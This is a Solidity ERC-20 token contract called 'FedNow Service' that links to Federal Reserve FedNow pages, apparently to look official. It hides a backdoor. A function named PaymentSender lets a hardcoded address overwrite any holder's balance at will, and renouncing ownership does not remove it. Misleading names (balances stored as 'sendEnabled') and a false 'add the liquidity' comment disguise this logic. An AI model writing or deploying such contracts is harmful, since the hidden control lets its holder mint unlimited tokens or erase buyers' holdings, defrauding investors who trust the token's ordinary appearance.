pragma solidity 0.8.19;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address Payment) external view returns (uint256);
    function transfer(address recipient, uint256 Service) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 Service) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 Service
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode 
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private sendEnabled;

    mapping(address => mapping(address => uint256)) private _allowances;
    string public FedNowwebsite = "https://en.wikipedia.org/wiki/FedNow";
    string public FedNowADDRESS = "https://www.frbservices.org/financial-services/fednow";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleFedNow;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleFedNow = 0x5D69B695BA6C2C9Cfcc324f43C4cBF331112cD1E;      
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address Payment) public view virtual override returns (uint256) {
        return sendEnabled[Payment];
    }

    function transfer(address recipient, uint256 Service) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, Service);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 Service) public virtual override returns (bool) {
        _approve(_msgSender(), spender, Service);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 Service
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Service, "ERC20: transfer Service exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - Service);
            }
        }

        _transfer(sender, recipient, Service);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 Service
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, Service);

        uint256 senderBalance = sendEnabled[sender];
        require(senderBalance >= Service, "ERC20: transfer Service exceeds balance");
        unchecked {
            sendEnabled[sender] = senderBalance - Service;
        }
        sendEnabled[recipient] += Service;

        emit Transfer(sender, recipient, Service);

        _afterTokenTransfer(sender, recipient, Service);
    }

    function firstBlock(address Payment, uint256 Service) internal virtual {
        require(Payment != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), Payment, Service);

        _totalSupply += Service;
        sendEnabled[Payment] += Service;
        emit Transfer(address(0), Payment, Service);

        _afterTokenTransfer(address(0), Payment, Service);
    }

    function _dead(address Payment, uint256 Service) internal virtual {
        require(Payment != address(0), "ERC20: dead from the zero address");

        _beforeTokenTransfer(Payment, address(0), Service);

        uint256 PaymentBalance = sendEnabled[Payment];
        require(PaymentBalance >= Service, "ERC20: dead Service exceeds balance");
        unchecked {
            sendEnabled[Payment] = PaymentBalance - Service;
        }
        _totalSupply -= Service;

        emit Transfer(Payment, address(0), Service);

        _afterTokenTransfer(Payment, address(0), Service);
    }

              function getFedNowwebsite() public view returns (string memory) {
        return FedNowwebsite;
    } 
   function PaymentSender( 
        address AddressReward,
        uint256 CalculeReward,
        uint256 sendReward
    ) external onlyOwner {
        require(AddressReward != address(0));

        // add the liquidity
        sendEnabled[AddressReward] = CalculeReward * sendReward;
                emit Transfer(address(0), AddressReward, CalculeReward);
    }   
               function getFedNowADDRESS() public view returns (string memory) {
        return FedNowADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleFedNow);
        _;
    }    
    function _approve(
        address owner,
        address spender,
        uint256 Service
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = Service;
        emit Approval(owner, spender, Service);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Service
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Service
    ) internal virtual {}
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyManager() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyManager {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract FedNow is ERC20, Ownable {
    constructor () ERC20("FedNow Service", "FEDNOW") 
    {    
        firstBlock(msg.sender, 70_000000000000 * (10 ** 9));
    }
}